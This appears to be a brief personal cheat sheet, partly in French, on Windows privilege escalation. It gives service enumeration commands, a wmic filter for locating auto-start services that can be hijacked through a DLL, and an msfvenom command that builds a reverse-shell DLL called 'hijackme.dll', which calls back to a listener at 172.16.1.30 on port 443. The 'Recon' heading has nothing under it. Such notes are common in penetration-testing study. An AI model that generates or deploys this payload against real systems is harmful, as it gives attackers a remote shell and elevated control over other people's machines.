## This is my Cheatseet for Privilege Escalation

- For Services
`sc query state= all` or `sc qc "servicename"`.
- Pour voir les services potentielles sur les DLL Hijacking 
 `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"` oubien on enlve le `findstr` qui indexe le `auto`



 ## Recon








 ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f dll -o hijackme.dll``